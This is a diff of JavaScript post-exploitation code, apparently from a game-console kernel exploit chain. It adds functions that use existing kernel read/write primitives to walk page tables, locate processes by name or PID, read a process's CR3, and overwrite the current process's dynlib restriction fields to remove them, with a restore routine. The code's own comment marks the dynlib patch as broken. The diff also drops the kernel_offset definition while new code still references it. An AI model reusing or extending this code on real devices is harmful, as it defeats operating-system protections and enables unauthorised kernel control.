@@ -8,16 +8,13 @@ let kernel = {
     write_buffer: null
 };
 
-let kernel_offset = {
-  // proc structure
-  PROC_FD:            0x48n,
-  PROC_PID:           0xbcn,
-  // filedesc
-  FILEDESC_OFILES:    0x8n,
-  SIZEOF_OFILES:      0x30n,
-  // net
-  SO_PCB:             0x18n,
-  INPCB_PKTOPTS:      0x120n,
+let dynlib_backup = {
+    saved: false,
+    addr: null,
+    prot: null,
+    ref: null,
+    start: null,
+    end: null
 };
 
 kernel.read_byte = function(kaddr) {
@@ -253,3 +250,204 @@ ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
     write_buffer(temp_addr, buf);
     ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
 };
+
+// CPU page table definitions
+const CPU_PDE_SHIFT = {
+    PRESENT: 0,
+    RW: 1,
+    USER: 2,
+    WRITE_THROUGH: 3,
+    CACHE_DISABLE: 4,
+    ACCESSED: 5,
+    DIRTY: 6,
+    PS: 7,
+    GLOBAL: 8,
+    XOTEXT: 58,
+    PROTECTION_KEY: 59,
+    EXECUTE_DISABLE: 63
+};
+
+const CPU_PDE_MASKS = {
+    PRESENT: 1n,
+    RW: 1n,
+    USER: 1n,
+    WRITE_THROUGH: 1n,
+    CACHE_DISABLE: 1n,
+    ACCESSED: 1n,
+    DIRTY: 1n,
+    PS: 1n,
+    GLOBAL: 1n,
+    XOTEXT: 1n,
+    PROTECTION_KEY: 0xfn,
+    EXECUTE_DISABLE: 1n
+};
+
+const CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
+const CPU_PG_PS_FRAME = 0x000fffffffe00000n;
+
+function cpu_pde_field(pde, field) {
+    const shift = CPU_PDE_SHIFT[field];
+    const mask = CPU_PDE_MASKS[field];
+    return Number((pde >> BigInt(shift)) & mask);
+}
+
+function cpu_walk_pt(cr3, vaddr) {
+    if (!vaddr || !cr3) {
+        throw new Error("cpu_walk_pt: invalid arguments");
+    }
+    
+    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
+    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
+    const pde_index = (vaddr >> 21n) & 0x1ffn;
+    const pte_index = (vaddr >> 12n) & 0x1ffn;
+    
+    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
+    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
+        return null;
+    }
+    
+    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
+    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
+    const pdpe = kernel.read_qword(pdpe_va);
+    
+    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
+        return null;
+    }
+    
+    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
+    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
+    const pde = kernel.read_qword(pde_va);
+    
+    if (cpu_pde_field(pde, "PRESENT") !== 1) {
+        return null;
+    }
+    
+    if (cpu_pde_field(pde, "PS") === 1) {
+        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
+    }
+    
+    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
+    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
+    const pte = kernel.read_qword(pte_va);
+    
+    if (cpu_pde_field(pte, "PRESENT") !== 1) {
+        return null;
+    }
+    
+    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
+}
+
+function is_kernel_rw_available() {
+    return kernel.read_buffer && kernel.write_buffer;
+}
+
+function check_kernel_rw() {
+    if (!is_kernel_rw_available()) {
+        throw new Error("kernel r/w is not available");
+    }
+}
+
+function find_proc_by_name(name) {
+    check_kernel_rw();
+    if (!kernel.addr.allproc) {
+        throw new Error("kernel.addr.allproc not set");
+    }
+    
+    let proc = kernel.read_qword(kernel.addr.allproc);
+    while (proc !== 0n) {
+        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
+        if (proc_name === name) {
+            return proc;
+        }
+        proc = kernel.read_qword(proc + 0x0n);
+    }
+    
+    return null;
+}
+
+function find_proc_by_pid(pid) {
+    check_kernel_rw();
+    if (!kernel.addr.allproc) {
+        throw new Error("kernel.addr.allproc not set");
+    }
+    
+    const target_pid = BigInt(pid);
+    let proc = kernel.read_qword(kernel.addr.allproc);
+    while (proc !== 0n) {
+        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
+        if (proc_pid === target_pid) {
+            return proc;
+        }
+        proc = kernel.read_qword(proc + 0x0n);
+    }
+    
+    return null;
+}
+
+function get_proc_cr3(proc) {
+    check_kernel_rw();
+    
+    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
+    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
+    
+    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
+}
+
+function virt_to_phys(virt_addr, cr3) {
+    check_kernel_rw();
+    if (!kernel.addr.dmap_base || !virt_addr) {
+        throw new Error("virt_to_phys: invalid arguments");
+    }
+    
+    cr3 = cr3 || kernel.addr.kernel_cr3;
+    return cpu_walk_pt(cr3, virt_addr);
+}
+
+function phys_to_dmap(phys_addr) {
+    if (!kernel.addr.dmap_base || !phys_addr) {
+        throw new Error("phys_to_dmap: invalid arguments");
+    }
+    return kernel.addr.dmap_base + phys_addr;
+}
+
+// TODO : fix this
+// This is actually broken
+// patching dynlib is not required to use sceKernelDlsym
+function patch_dynlib_restriction() {
+    check_kernel_rw();
+    if (!kernel.addr.curproc) {
+        throw new Error("kernel.addr.curproc not set");
+    }
+    
+    const addr = kernel.read_qword(kernel.addr.curproc + 0x3e8n);
+    
+    if (!dynlib_backup.saved) {
+        dynlib_backup.addr = addr;
+        dynlib_backup.prot = kernel.read_dword(addr + 0x118n);
+        dynlib_backup.ref = kernel.read_qword(addr + 0x18n);
+        dynlib_backup.start = kernel.read_qword(addr + 0xf0n);
+        dynlib_backup.end = kernel.read_qword(addr + 0xf8n);
+        dynlib_backup.saved = true;
+    }
+    
+    kernel.write_dword(addr + 0x118n, 0n);
+    kernel.write_qword(addr + 0x18n, 1n);
+    kernel.write_qword(addr + 0xf0n, 0n);
+    kernel.write_qword(addr + 0xf8n, 0xffffffffffffffffn);
+}
+
+
+function restore_dynlib_restriction() {
+    check_kernel_rw();
+    if (!kernel.addr.curproc) {
+        throw new Error("kernel.addr.curproc not set");
+    }
+    if (!dynlib_backup.saved) {
+        throw new Error("Cannot restore: original values not saved");
+    }
+    
+    kernel.write_dword(dynlib_backup.addr + 0x118n, dynlib_backup.prot);
+    kernel.write_qword(dynlib_backup.addr + 0x18n, dynlib_backup.ref);
+    kernel.write_qword(dynlib_backup.addr + 0xf0n, dynlib_backup.start);
+    kernel.write_qword(dynlib_backup.addr + 0xf8n, dynlib_backup.end);
+}
